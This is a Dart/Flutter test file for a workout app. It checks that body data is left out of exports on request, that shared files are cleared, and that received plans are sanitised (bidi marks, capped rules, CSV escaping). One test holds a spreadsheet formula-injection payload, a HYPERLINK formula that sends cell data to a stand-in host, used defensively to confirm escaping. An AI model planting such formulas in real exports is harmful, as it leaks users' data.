import 'dart:convert';
import 'dart:io';

import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:sqflite_common_ffi/sqflite_ffi.dart';
import 'package:workout/ai/tools.dart';
import 'package:workout/data/backup.dart';
import 'package:workout/data/csv_export.dart';
import 'package:workout/domain/body.dart';
import 'package:workout/domain/plan_share.dart';
import 'package:workout/domain/program.dart';
import 'package:workout/data/export.dart';
import 'package:workout/data/repo.dart';
import 'package:workout/domain/exercise.dart';
import 'package:workout/domain/library.dart';
import 'package:workout/domain/plan.dart';
import 'package:workout/domain/units.dart';
import 'package:workout/packs/pack.dart';
import 'package:workout/ui/app_state.dart';

/// Fixes from the fifth review (REVIEW-2026-11-22-1342), fix batch 20b.
void main() {
  sqfliteFfiInit();
  final lib = Library.fromJsonString(File('assets/exercises.json').readAsStringSync());
  final full = Profile(goal: Goal.both, days: 4, minutes: 60, have: Equipment.values.toSet(), avoid: {}, unit: Unit.kg);
  // numbers that can only come from the body data
  const bodyNumbers = ['82.37', '183.7', '80.66', '16.66', '77.77', '86.4'];

  Future<AppState> app() async {
    final dir = Directory.systemTemp.createTempSync('fix20b');
    final r = await Repo.open('${dir.path}/t.db', factory: databaseFactoryFfi);
    final s = await AppState.forTest(r, PackStore(dir.path), lib);
    await s.saveProfile(full.copyWith(bodyKg: 82.37, heightCm: 183.7));
    await s.makeBuiltInPlan();
    final ses = await s.repo.startSession(s.plan!, 0, s.plan!.days.first);
    await s.repo.logSet(ses.id, 'back_squat', 100, 5);
    await s.repo.finishSession(ses.id, s.lib, s.unit);
    // a weigh-in through the AI: its words and a profile snapshot go into the change log
    final r0 = parseToolReply('SAY: ok\nDO: body 80.66 kg fat 16.66', s);
    await s.runActions('I weigh 80.66 kg, 16.66% fat', r0.actions);
    await s.addAim('body', 77.77);
    await s.addTape('waist', 86.4);
    await s.reload();
    return s;
  }

  /// Every value in a SQLite file, read with a real reader (REAL columns are binary on disk).
  Future<String> sqliteValues(List<int> bytes) async {
    final p = '${Directory.systemTemp.createTempSync('sq').path}/x.sqlite';
    File(p).writeAsBytesSync(bytes);
    final db = await databaseFactoryFfi.openDatabase(p);
    final b = StringBuffer();
    for (final t in await db.rawQuery("SELECT name FROM sqlite_master WHERE type = 'table'")) {
      for (final row in await db.query(t['name'] as String)) {
        b.writeln('${t['name']} ${row.values.join(' ')}');
      }
    }
    await db.close();
    return b.toString();
  }

  group('P1-1 "Leave it out" leaves all body data out', () {
    test('the SQLite copy, by allow-list: no undo logs, no body goal, no body fields', () async {
      final s = await app();
      expect(s.aiChanges, isNotEmpty, reason: 'the AI change log holds the weigh-in words');
      final no = await sqliteValues((await buildExport(ExportKind.sqlite, s.repo, lib, const ExportOptions(unit: Unit.kg), factory: databaseFactoryFfi)).bytes);
      for (final n in bodyNumbers) {
        expect(no, isNot(contains(n)), reason: 'SQLite without body data holds $n');
      }
      expect(no, isNot(contains('ai_changes')));
      expect(no, contains('back_squat'), reason: 'the workouts are there');
      final yes = await sqliteValues((await buildExport(ExportKind.sqlite, s.repo, lib, const ExportOptions(unit: Unit.kg, body: true), factory: databaseFactoryFfi)).bytes);
      for (final n in ['82.37', '183.7', '77.77', '86.4']) {
        expect(yes, contains(n), reason: 'with body data, $n is in');
      }
    });

    test('the backup and the zip: no body goal, no AI log', () async {
      final s = await app();
      final b = await exportBackup(s.repo, body: false);
      for (final n in bodyNumbers) {
        expect(b, isNot(contains(n)), reason: 'backup without body data holds $n');
      }
      expect(jsonDecode(b)['hasBody'], false);
      expect(backupHasBody(b), isFalse);
      expect(backupHasBody(await exportBackup(s.repo)), isTrue);
      final zip = await buildExport(ExportKind.all, s.repo, lib, const ExportOptions(unit: Unit.kg));
      expect(zip.bytes, isNotEmpty);
    });
  });

  test('P1-3 a full restore of a no-body backup keeps the phone body data', () async {
    final s = await app();
    final file = await exportBackup(s.repo, body: false);
    await importBackup(s.repo, file, replace: true);
    await s.reload();
    expect((await s.repo.bodyLog()).length, 1);
    expect(s.tape.single.cm, 86.4);
    expect(s.profile!.bodyKg, 82.37);
    expect(s.profile!.heightCm, 183.7);
    expect(s.aims.where((a) => a.kind == 'body').single.target, 77.77);
    expect(s.plan, isNotNull, reason: 'the rest came from the file');
    // a backup with body data still replaces it
    final withBody = await exportBackup(s.repo);
    await s.repo.logBody(70);
    await importBackup(s.repo, withBody, replace: true);
    expect((await s.repo.bodyLog()).length, 1);
  });

  test('P1-2 Delete all data and the next start clear the shared files', () async {
    TestWidgetsFlutterBinding.ensureInitialized();
    final tmp = Directory.systemTemp.createTempSync('cachedir');
    TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(const MethodChannel('plugins.flutter.io/path_provider'), (c) async => tmp.path);
    TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(const MethodChannel('plugins.it_nomads.com/flutter_secure_storage'), (c) async => null);
    final s = await app();
    AppState.clearPicked = () async {};
    final shared = File('${tmp.path}/exports/workout-backup.json')..createSync(recursive: true);
    shared.writeAsStringSync('{}');
    await s.wipeEverything();
    expect(shared.existsSync(), isFalse);
    final again = File('${tmp.path}/exports/x.csv')..createSync(recursive: true);
    await AppState.clearShared();
    expect(again.existsSync(), isFalse);
  });

  group('P2 received plans', () {
    final base = Plan(name: 'P', source: 'mine', days: [
      PlanDay(name: 'A', items: [const PlanItem(exerciseId: 'bench_press', sets: 3, repLow: 5, repHigh: 5, restSec: 120), const PlanItem(exerciseId: 'back_squat', sets: 3, repLow: 5, repHigh: 5, restSec: 120)]),
    ]);
    Map<String, dynamic> withRules(Map<String, dynamic> rules) => {...sharePlanMap(base), 'program': {'id': 'x', 'rules': rules}};

    test('P2-1 rules only for lifts in the plan; huge keys, 12000 rules, 11 scripts', () {
      final many = {for (var i = 0; i < 12000; i++) 'bench_press#$i': {'kind': 'linear'}};
      var r = readSharedPlan(jsonEncode(withRules(many)), lib);
      expect(r.ok, isTrue);
      expect(r.plan!.program!.rules, isEmpty, reason: 'no slot #N is in the plan');
      expect(r.notes.join(), contains('12000 progression rules for lifts not in the plan were left out'));
      r = readSharedPlan(jsonEncode(withRules({'x' * 900000: {'kind': 'linear'}, 'bench_press': {'kind': 'linear'}})), lib);
      expect(r.plan!.program!.rules.keys, ['bench_press']);
      r = readSharedPlan(jsonEncode(withRules({'deadlift': {'kind': 'linear'}})), lib);
      expect(r.plan!.program!.rules, isEmpty, reason: 'deadlift is not in the plan');
      final scripts = {for (var i = 0; i < 11; i++) 'bench_press${i == 0 ? '' : '#T$i'}': {'kind': 'script', 'script': 'if top: add 1'}};
      expect(readSharedPlan(jsonEncode(withRules(scripts)), lib).problems.join(), contains('11 own rules; 10 at most'));
      expect(readSharedPlan(jsonEncode({...sharePlanMap(base), 'v': 0}), lib).ok, isFalse, reason: 'N41: v below 1');
    });

    test('P2-2 a held script: no sender comments, every line in plain words, big jumps marked', () {
      final r = readSharedPlan(jsonEncode(withRules({
        'bench_press': {'kind': 'script', 'script': '# adds a little when you hit the top \u202E\nif always: add 50 kg\nif miss: times 1.5\nelse: same'}
      })), lib);
      expect(r.ok, isTrue, reason: r.problems.join());
      final s = r.scripts['bench_press']!;
      expect(s, isNot(contains('#')));
      expect(s, isNot(contains('\u202E')));
      final w = scriptWords(s);
      expect(w, [('Every workout: add 50 kg', true), ('After a short set: weight × 1.5 (goes UP)', true), ('Otherwise: keep the weight', false)]);
      expect(scriptWords('if top: add 1'), [('Every set at the top of the range: add 1 weight step', false)]);
    });

    test('P2-3 names: no bidi or zero-width marks, cut on whole letters, few combining marks', () {
      final m = sharePlanMap(base)..['name'] = 'Push \u202Eyad llup\u202C day\u200B';
      expect(readSharedPlan(jsonEncode(m), lib).plan!.name, 'Push yad llup day');
      final emoji = sharePlanMap(base)..['name'] = '${'a' * 59}💪💪';
      final n = readSharedPlan(jsonEncode(emoji), lib).plan!.name;
      expect(n.runes.length, 60);
      expect(n.codeUnitAt(n.length - 1) >= 0xD800 && n.codeUnitAt(n.length - 1) <= 0xDBFF, isFalse, reason: 'no lone surrogate at the end');
      expect(n.endsWith('💪'), isTrue);
      final zalgo = sharePlanMap(base)..['name'] = 'Z${'\u0301' * 58}ok';
      expect(readSharedPlan(jsonEncode(zalgo), lib).plan!.name, 'Z\u0301\u0301ok');
    });

    test('P2-4 a stranger name never becomes a spreadsheet formula', () async {
      expect(csvField('=1+1'), '"\'=1+1"');
      expect(csvField('@SUM(A1)'), '"\'@SUM(A1)"');
      expect(csvField('+44'), '"\'+44"');
      expect(csvField('＝1'), '"\'＝1"');
      expect(csvField('-2.5'), '"-2.5"', reason: 'numbers stay numbers');
      expect(csvField('Bench press'), '"Bench press"');
      final s = await app();
      final m = sharePlanMap(base)
        ..['name'] = '=HYPERLINK("http://x.example/?"&A1,"open")'
        ..['days'] = [
          {...(sharePlanMap(base)['days'] as List).first as Map<String, dynamic>, 'name': '=1+1'}
        ];
      final r = readSharedPlan(jsonEncode(m), lib);
      await s.usePlan(r.plan!);
      final ses = await s.repo.startSession(s.plan!, 0, s.plan!.days.first);
      await s.repo.logSet(ses.id, 'bench_press', 60, 5);
      await s.repo.finishSession(ses.id, s.lib, s.unit);
      for (final k in [ExportKind.strong, ExportKind.hevy, ExportKind.plansCsv, ExportKind.everything]) {
        final csv = utf8.decode((await buildExport(k, s.repo, lib, ExportOptions(unit: Unit.kg, from: DateTime(2000)))).bytes);
        expect(csv, isNot(contains(',"=')), reason: '$k: no cell starts with =');
        expect(csv.startsWith('"='), isFalse);
      }
      final plans = utf8.decode((await buildExport(ExportKind.plansCsv, s.repo, lib, const ExportOptions(unit: Unit.kg))).bytes);
      expect(plans, contains('"\'=1+1"'));
      expect(plans, contains('"\'=HYPERLINK('));
    });
  });

  test('P2-7 heights: every word reaches the tool; a lone 5" or 6 in is not feet', () async {
    expect(parseHeight('5"'), isNull);
    expect(parseHeight('6 in'), isNull);
    expect(parseHeight('5 ft 10'), closeTo(177.8, 0.01));
    expect(parseHeight('5 10'), closeTo(177.8, 0.01));
    expect(parseHeight("5'10\""), closeTo(177.8, 0.01));
    expect(parseHeight('5 ft'), closeTo(152.4, 0.01));
    expect(parseHeight('70 in'), closeTo(177.8, 0.01));
    final s = await app();
    final r = parseToolReply('SAY: ok\nDO: profile height 5 ft 10', s);
    expect(r.errors, isEmpty);
    expect(r.actions.single.says, contains('178 cm'), reason: 'a kg user sees cm');
    await r.actions.single.run(s);
    expect(s.profile!.heightCm, closeTo(177.8, 0.01));
  });

  test('P3-N31 the points say when the body weight is outside their range', () {
    expect(pointsEdge(80, female: false), isNull);
    expect(pointsEdge(35, female: false), contains('count it as 40 kg'));
    expect(pointsEdge(160, female: true), contains('150 kg'));
  });
}
